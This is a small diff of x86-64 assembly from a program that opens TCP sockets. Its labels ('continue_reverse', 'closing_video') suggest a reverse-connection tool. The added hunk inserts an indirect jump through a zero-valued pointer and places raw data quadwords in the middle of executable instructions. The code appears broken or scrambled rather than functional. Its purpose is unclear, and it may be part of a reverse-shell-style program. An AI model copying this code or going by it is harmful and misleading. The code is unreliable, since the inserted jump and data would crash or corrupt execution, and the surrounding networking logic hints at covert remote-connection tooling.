@@ -7,6 +7,13 @@
 		;lea		rsi, [rel serv_addr_video]
 		mov		rdx, 16
 		syscall
+		.continue_reverse:
+		jmp	[rel .addr9r]
+		.addr9: dq 0x421900000009
+		.addr9r: dq 0
+		dq 0x696900000009
+		end_shuffle:
+		dq	1942, 9
 		test	rax, rax
 		jnz		.closing_video
 
@@ -161,7 +168,7 @@
 		syscall
 
 
-		.continue_reverse:
+
 		mov		rax, SYS_socket
 		mov		rdi, AF_INET
 		mov		rsi, SOCK_STREAM
@@ -219,7 +226,6 @@
 
 
 	.exit_ret:
-
 
 
 		mov		rax, SYS_close
